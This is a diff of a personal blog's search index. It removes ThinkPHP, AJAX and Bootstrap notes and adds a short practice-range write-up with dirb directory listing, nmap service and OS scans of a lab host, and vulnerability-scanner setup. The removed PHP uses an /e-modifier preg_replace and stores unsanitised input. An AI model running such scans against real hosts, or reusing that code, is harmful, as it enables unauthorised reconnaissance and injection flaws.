</span><br><span class="line">	可重复</span><br><span class="line">	background-size:contain</span><br></pre></td></tr></table></figure>
-<h4 id="thinkphp5.1">ThinkPhp5.1</h4>
-<ol type="1">
-<li>在linux下,需要权限php程序才能运行php文件,所以需要<code>chown apache2.apache2 /var/html/tp5/runtime -R</code> 递归修改tp5下的runtime目录</li>
-<li>在linux下,使用文件上传,应该给tp5目录下的public/upload目录apapche用户权限,否则无法上传文件.</li>
-<li>在linux下,需要额外安装php7.2-mysql,否则会产生无法访问数据库的错误.</li>
-<li>linux配置php-fpm时,使用sock连接fpm时应该这么写</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        DocumentRoot &quot;&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&quot;                        </span><br><span class="line">        ServerName www.divint3.com            </span><br><span class="line">        ServerAlias divint3.com               </span><br><span class="line">        DirectoryIndex index.htm index.php index.html</span><br><span class="line">  &lt;Directory &quot;&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&quot;&gt;</span><br><span class="line">        Options FollowSymLinks ExecCGI &#x2F;&#x2F;禁止访问目录,允许在该目录下执行CGI脚本</span><br><span class="line">        AllowOverride All &#x2F;&#x2F;允许rewrite,根据htc</span><br><span class="line">        Order allow,deny &#x2F;&#x2F;设置缺省的访问权限与Allow和Deny语句的处理顺序</span><br><span class="line">        Allow from all &#x2F;&#x2F;允许从任何地址访问</span><br><span class="line">        Require all granted &#x2F;&#x2F;允许所有请求访问资源</span><br><span class="line">        Satisfy all &#x2F;&#x2F;禁止直接访问</span><br><span class="line">  &lt;&#x2F;Directory&gt;</span><br><span class="line">        ProxyRequests Off</span><br><span class="line">        ProxyPassMatch ^&#x2F;(.*\.php(&#x2F;.*)?)$ unix:&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock|fcgi:&#x2F;&#x2F;localhost&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&#x2F;</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure>
-<p>最后用phpinfo()验证是否开启php-fpm成功</p>
-<ol start="5" type="1">
-<li>linux下apache开启模块 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a2enmod rewrite </span><br><span class="line">a2enmod proxy</span><br><span class="line">a2enmod proxy_fcgi</span><br></pre></td></tr></table></figure></li>
-<li>想要隐藏url的php文件名,应该编辑.<strong>htaccess</strong> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  &#x2F;&#x2F;以上为默认配置文件</span><br><span class="line">  RewriteRule ^(.*)$ index.php?s&#x3D;$1 [QSA,PT,L]</span><br><span class="line">  &#x2F;&#x2F;写的是rewrite规则,可以省略index.php文件访问</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure></li>
-<li>本来要自己写分页操作的,没想到tp5自己有分页操作,语法 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bkList</span><span class="params">($type)</span></span>&#123;</span><br><span class="line">    $info=Bkarticle::where(<span class="string">"type"</span>,$type)-&gt;paginate(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">// 获取分页显示</span></span><br><span class="line">    $page = $info-&gt;render();</span><br><span class="line">    <span class="comment">// 模板变量赋值</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;assign(<span class="string">'info'</span>, $info);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;assign(<span class="string">'page'</span>, $page);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> Bkartical为数据库中的同名表.可用于查询数据库中的同名表.<code>paginate(10)</code>的意思是每页显示十条数据. 这是tp5中的模型操作数据库. <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;extend name="./common/father" /&#125; //继承父模板</span><br><span class="line"></span><br><span class="line">&#123;block name="title"&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>灾害大百科<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;/block&#125;</span><br><span class="line"></span><br><span class="line">&#123;block name="content"&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"text-center table  table-bordered"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>文章标题<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>文章内容预览<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;volist name='info' id='bklist' length="50"&#125;</span><br><span class="line">            &#123;php&#125;</span><br><span class="line">                $content=$bklist["content"];</span><br><span class="line">                preg_replace('/<span class="tag">&lt;<span class="name">\s*img\s+[^</span>&gt;</span>]*?src\s*=\s*(\'|\")(.*?)\\1[^&gt;]*?\/?\s*&gt;/i','[图片]',$content); //把数据库中取出的html文本数据中的匹配img标签的文本替换为[img],因为这这只是一个预览内容,不能把整个img文件链接地址暴露出来</span><br><span class="line">                preg_replace('/(<span class="tag">&lt;/<span class="name">?)(w+)([^</span>&gt;</span>]*&gt;)/e', "'\1'.strtoupper('\2').'\3'", $content); //替换掉所有标签,只保留文本内容</span><br><span class="line">                $content=substr($content,0,100); //截取100的长度</span><br><span class="line">            &#123;/php&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/bkarticle/&#123;$bklist.id&#125;"</span>&gt;</span>&#123;$bklist.title&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"text-left"</span>&gt;</span>&#123;php&#125;echo $content;&#123;/php&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;/volist&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"float-right"</span>&gt;</span>&#123;$info|raw&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> //这里输出分页表</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;/block&#125;</span><br><span class="line"></span><br><span class="line">&#123;block name="js"&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/static/js/baike/bklist.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;/block&#125;</span><br></pre></td></tr></table></figure> 使用jquery为对象添加class,因为{$info|raw}输出的是一个html代码,而这个代码不法修改,只能用jquery确定元素,增加class <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(function () &#123;</span><br><span class="line">    $(&quot;main section div div ul li&quot;).addClass(&quot;page-item&quot;);</span><br><span class="line">    $(&quot;main section div div ul span&quot;).addClass(&quot;page-link&quot;);</span><br><span class="line">    $(&quot;main section div div ul li a&quot;).addClass(&quot;page-link&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure> 分页效果如下 <img src="/uploads/fzcms.png" alt="分页" /></li>
-<li>phpstrom在linux下有个东西不知道怎么取消,反正就是根据是否使用git提交文件的颜色会有变化,其实只要Alt+F12 用git同步就行了,一个add,一个comment颜色就没啦,这种颜色不一样保持了我这个强迫症不断备份啊.红色是未提交,绿色是新添加,蓝色是已修改</li>
-</ol>
-<p>9.PHP版本过高会使tp5无法连接数据库,在尝试数据库迁移时,会报错<code>SQLSTATE[HY000] [2054] The server requested authentication method unknown to the client</code>发生这种错误，是由于MySQL 8默认使用了新的密码验证插件：caching_sha2_password，而之前的PHP版本中所带的mysqlnd无法支持这种验证。</p>
-<p>修改 /etc/mysql/my.cnf，添加下面一行： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">default_authentication_plugin&#x3D; mysql_native_password</span><br></pre></td></tr></table></figure> 然后重置密码： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER USER &#39;user&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;password&#39;;</span><br></pre></td></tr></table></figure> ---</p>
-<h4 id="简单的ajax.post">简单的ajax.post</h4>
-<ol type="1">
-<li>首先说说a标签如何触发onclick事件</li>
-</ol>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:void(0);"</span> <span class="attr">onclick</span>=<span class="string">"js_method()"</span>&gt;</span>Some Thing<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里herf超链接指向了一个空的js脚本,然后定义onclick事件 这样,我们可以使用a标签使用onclick事件发送一个ajax请求 定义一个类 叫做upload,创建一个方法,用来接收数据,这里在js处理完数据后,php仍然会检验数据可用性,我把它定义在了<strong>admin/bkadd/addcheck</strong>下, <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 前端文章上传类</span></span><br><span class="line"><span class="comment">* @author Divint3</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> upload = &#123;</span><br><span class="line">    check: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> type = $(<span class="string">'input[name="type"]:checked'</span>).val();</span><br><span class="line">        <span class="keyword">var</span> title = $(<span class="string">'input[name="title"]'</span>).val();</span><br><span class="line">        <span class="keyword">var</span> content = editor.txt.html();<span class="comment">//获取各种值并定义变量</span></span><br><span class="line">        <span class="keyword">if</span> (content == <span class="string">"&lt;p&gt;&lt;br&gt;&lt;/p&gt;"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"内容不能为空"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!title) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"标题不能为空"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!type) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"未指定文章类型"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">"admin/bkadd/addcheck"</span>;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;</span><br><span class="line">            <span class="string">"type"</span>: type,</span><br><span class="line">            <span class="string">"title"</span>: title,</span><br><span class="line">            <span class="string">"content"</span>: content,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        $.post(url, data, <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;<span class="comment">//result是admin/bkadd/addcheck返回的json数据</span></span><br><span class="line">            <span class="keyword">if</span> (result.status) &#123;<span class="comment">//status返回的是php检验数据是否成功,检验数据成功后,tp5助手函数db会返回一个非零数值,如果插入失败,返回零</span></span><br><span class="line">                dialog.success(result.message);<span class="comment">//dialog封装了layer弹出层的方法,方便调用</span></span><br><span class="line">                editor.txt.html(<span class="string">'&lt;p&gt;&lt;br&gt;&lt;/p&gt;'</span>);</span><br><span class="line">                $(<span class="string">'input[name="title"]'</span>).val(<span class="string">""</span>);<span class="comment">//数据信息清空</span></span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                dialog.error(result.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"JSON"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
-<p>PHP检验代码如下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//这里接收ajax请求,处理请求</span></span><br><span class="line">        $type = $_POST[<span class="string">'type'</span>];</span><br><span class="line">        $title = $_POST[<span class="string">'title'</span>];</span><br><span class="line">        $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!$type) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'未指定文章类型'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$title) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'标题不能为空'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($content == <span class="string">"&lt;p&gt;&lt;br&gt;&lt;/p&gt;"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'内容不能为空'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [</span><br><span class="line">            <span class="string">"type"</span> =&gt; $type,</span><br><span class="line">            <span class="string">"title"</span> =&gt; $title,</span><br><span class="line">            <span class="string">"content"</span> =&gt; $content,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $isset = Bkarticle::where(<span class="string">"title"</span>, $title)-&gt;find();</span><br><span class="line">        <span class="keyword">if</span> ($isset == <span class="keyword">array</span>()) &#123;</span><br><span class="line">            $s = db(<span class="string">"bkarticle"</span>)-&gt;data($data)-&gt;insert();</span><br><span class="line">            <span class="keyword">return</span> show($s, <span class="string">"插入百科文章成功"</span>, <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">"type"</span> =&gt; $type,</span><br><span class="line">                <span class="string">"content"</span> =&gt; $content,</span><br><span class="line">            ));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">"这个文章名已经被用过了"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>这里的show方法我定义在了application下的comment.php下,因为这里是公共方法,所有方法都可以引用 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($status, $message, $data = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result=[</span><br><span class="line">        <span class="string">'status'</span>=&gt;$status,</span><br><span class="line">        <span class="string">'message'</span>=&gt;$message,</span><br><span class="line">        <span class="string">'data'</span>=&gt;$data,</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">exit</span>(json_encode($result));</span><br><span class="line">&#125;<span class="comment">//就是返回了一个json,给使用ajax.post方法的一个result,这样js才能处理插入状态</span></span><br></pre></td></tr></table></figure></p>
-<hr />
-<h4 id="bootstrap4">bootstrap4</h4>
-<ol type="1">
-<li>使用bs4的原因是他的排版和配色真的好看,给大家一个bs4主题链接https://bootswatch.com/ ,配色什么的方案多样.</li>
-<li>bs4的栅格结构也很好,支持动态响应.反正我现阶段是写不出来.</li>
-<li>bs4没啥好说的,就是个css加js,调用就完事了. 常用知识点 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">容器</span><br><span class="line">	container 类用于固定宽度并支持响应式布局的容器。</span><br><span class="line">	container-fluid 类用于 100% 宽度，占据全部视口（viewport）的容器</span><br><span class="line">颜色操作 bg-</span><br><span class="line">	primary</span><br><span class="line">	secondary</span><br><span class="line">	success</span><br><span class="line">	waring</span><br><span class="line">	light(高亮)</span><br><span class="line">	</span><br><span class="line">前景色 text-</span><br><span class="line"></span><br><span class="line">字体位置</span><br><span class="line">	text-center&#x2F;left&#x2F;right</span><br><span class="line">	font-weight-normal 普通</span><br><span class="line">				-bold 加粗</span><br><span class="line">英文变换</span><br><span class="line">	text-lowercase 小写</span><br><span class="line">		-uppercase 大写</span><br><span class="line">		-capitalize 自动大小写</span><br><span class="line">字体大小 display-</span><br><span class="line">	display-1 最大</span><br><span class="line">			-2</span><br><span class="line">			-3</span><br><span class="line">			-4 最小</span><br><span class="line"></span><br><span class="line">网格系统 col-</span><br><span class="line">	一共划分为12个网格</span><br><span class="line">	.col- 针对极小屏幕</span><br><span class="line">	.col-sm- 平板 - 屏幕宽度等于或大于 576px</span><br><span class="line">	.col-md- 桌面显示器 - 屏幕宽度等于或大于 768px)</span><br><span class="line">	.col-lg- 大桌面显示器 - 屏幕宽度等于或大于 992px)</span><br><span class="line">	.col-xl- 超大桌面显示器 - 屏幕宽度等于或大于 1200px)</span><br><span class="line">	</span><br><span class="line">	xl与lg同时存在,若大于xl判定,使用xl规则,大于lg小于xl,使用lg规则,以此类推</span><br><span class="line">	只定义了col-md 那么md及md以上使用md的规则,md以下使用默认规则</span><br><span class="line">	</span><br><span class="line">	offset-</span><br><span class="line">		偏移系统,指定偏移多少单位,最高12</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">余白与边框 </span><br><span class="line">	padding 余白</span><br><span class="line">	margin 边框</span><br><span class="line">	写法</span><br><span class="line">		p&#x2F;m&#123;location&#x3D;t[op]b[lod]l[eft]r[ight]xy&#125;-size</span><br><span class="line">		x代表上下</span><br><span class="line">		y代表左右</span><br><span class="line">	size定义值</span><br><span class="line">		1 0.25rem</span><br><span class="line">		2 0.5rem</span><br><span class="line">		3 1rem</span><br><span class="line">		4 1.5rem</span><br><span class="line">		5 3rem</span><br><span class="line">	maigin在class中定义</span><br><span class="line">		margin-tblr:#px %</span><br><span class="line">	        &#123;margin-left: auto;</span><br><span class="line">            margin-right: auto;&#125;代表水平居中</span><br><span class="line">			</span><br><span class="line">按钮定义 btn-</span><br><span class="line">	primary</span><br><span class="line">	secondary</span><br><span class="line">	success</span><br><span class="line">	waring</span><br><span class="line">	light(高亮)</span><br><span class="line">定义行 row</span><br><span class="line">显示顺序 order	</span><br><span class="line">	order-屏幕尺寸-顺序值</span><br></pre></td></tr></table></figure></li>
-</ol>
-<hr />
-<h4 id="layer弹出层">layer弹出层</h4>
-<p>这就是个充数的,调用看官网就行了.</p>
-<hr />
-<h4 id="markdown">MarkDown</h4>
-<p>同上</p>
+    <title>靶场8</title>
+    <url>/%E9%9D%B6%E5%9C%BA8/</url>
+    <content><![CDATA[<h1 id="靶场八">靶场八</h1>
+<p>看网页源代码,得到flag1<code>flag1{Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=}</code></p>
+<p>解码得到<code>CIA – Operation Treadstone</code> cwel 爬取字典<code>https://bourne.fandom.com/wiki/Operation_Treadstone</code> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [21:12:08] C:130</span></span><br><span class="line">$ dirb http://172.17.135.8/ -S </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Fri May 31 21:12:11 2019</span><br><span class="line">URL_BASE: http://172.17.135.8/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">OPTION: Silent Mode</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://172.17.135.8/ ----</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/admin/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/css/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/db/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/dist/</span><br><span class="line">+ http://172.17.135.8/index.php (CODE:200|SIZE:2433)</span><br><span class="line">+ http://172.17.135.8/server-status (CODE:403|SIZE:292)</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/squirrelmail/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/supplier/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/upload/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/user/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.8/vendor/</span><br></pre></td></tr></table></figure></p>
+<p>nmap</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [21:49:01] </span></span><br><span class="line">$ nmap 172.17.135.8 -Pn -sS                        </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-31 22:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.8</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 993 filtered ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">21/tcp  open  ftp</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">110/tcp open  pop3</span><br><span class="line">143/tcp open  imap</span><br><span class="line">993/tcp open  imaps</span><br><span class="line">995/tcp open  pop3s</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 20.90 seconds</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [21:14:25] C:130</span></span><br><span class="line">$ nmap 172.17.135.8 -A -O -sS</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-31 21:14 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.8</span><br><span class="line">Host is up (0.0020s latency).</span><br><span class="line">Not shown: 993 filtered ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">21/tcp  open  ftp      vsftpd 3.0.2</span><br><span class="line">22/tcp  open  ssh      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 a9:98:84:aa:90:7e:f1:e6:be:c0:84:3e:fa:aa:83:8a (DSA)</span><br><span class="line">|   2048 07:5c:77:15:30:5a:17:95:8e:0f:91:f0:2d:0b:c3:7a (RSA)</span><br><span class="line">|_  256 2f:9c:29:b5:f5:dc:f4:95:07:6d:41:ee:f9:0d:15:b8 (ECDSA)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: BlackMarket Weapon Management System</span><br><span class="line">110/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE SASL STLS PIPELINING RESP-CODES UIDL CAPA TOP</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">143/tcp open  imap     Dovecot imapd (Ubuntu)</span><br><span class="line">|_imap-capabilities: listed OK IDLE more ID ENABLE LOGIN-REFERRALS LITERAL+ STARTTLS post-login capabilities SASL-IR Pre-login LOGINDISABLEDA0001 have IMAP4rev1</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">993/tcp open  ssl/imap Dovecot imapd (Ubuntu)</span><br><span class="line">|_imap-capabilities: listed OK IDLE IMAP4rev1 AUTH=PLAINA0001 LOGIN-REFERRALS LITERAL+ post-login more ID SASL-IR capabilities Pre-login have ENABLE</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">995/tcp open  ssl/pop3 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) USER PIPELINING RESP-CODES UIDL CAPA TOP</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2017-11-01T07:05:35</span><br><span class="line">|_Not valid after:  2027-11-01T07:05:35</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.2, Linux 3.16 - 4.6, Linux 3.2 - 4.6, Linux 4.4</span><br><span class="line">Network Distance: 3 hops</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   ...</span><br><span class="line">2   5.15 ms bogon (192.168.230.30)</span><br><span class="line">3   3.27 ms 172.17.135.8</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 26.36 seconds</span><br></pre></td></tr></table></figure>
+<p>配置漏洞扫描器 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulnersCom&#x2F;nmap-vulners.git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;scipag&#x2F;vulscan.git</span><br><span class="line">cd vulscan&#x2F;utilities&#x2F;updater&#x2F;</span><br><span class="line">chmod +x updateFiles.sh</span><br><span class="line">.&#x2F;updateFiles.sh</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script vulscan  -sV 172.17.135.8</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>编程</category>
+        <category>writeup</category>
       </categories>
   </entry>
   <entry>
-    <title>akonadi-提示无法连接数据库</title>
-    <url>/akonadi-%E6%8F%90%E7%A4%BA%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
-    <content><![CDATA[<p>缺少依赖,安装 <strong>akonadi-backend-mysql</strong></p>
-]]></content>
-      <categories>
-        <category>answer&amp;question</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>计算机网络第三节课笔记-物理层</title>
-    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%89%A9%E7%90%86%E5%B1%82/</url>
-    <content><![CDATA[
+    <title>操作系统第五节课笔记-进程控制</title>
+    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
+    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6.pdf" title="操作系统第五节课笔记-进程控制pdf文档下载">操作系统第五节课笔记-进程控制pdf文档下载</a>
 <a id="more"></a>
-<p>#物理层</p>
-<h2 id="传输介质">传输介质</h2>
-<h3 id="分类">分类</h3>
-<h4 id="导引性-有线">导引性-有线</h4>
+<h1 id="进程控制">进程控制</h1>
+<h3 id="进程控制块-pcb">进程控制块-PCB</h3>
+<p>Process Control Block</p>
 <ul>
-<li>铜线</li>
-<li>光缆</li>
